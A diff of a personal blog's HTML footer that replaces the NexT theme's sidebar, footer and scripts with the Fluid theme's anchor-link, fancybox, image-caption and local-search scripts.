-        <span class="site-state-item-count">27</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2024</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">true</span>
-</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
 
-<script src="/js/utils.js"></script>
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
 
-<script src="/js/motion.js"></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
-<script src="/js/next-boot.js"></script>
 
 
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-
-  <script async src="/js/cursor/fireworks.js"></script>
-
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
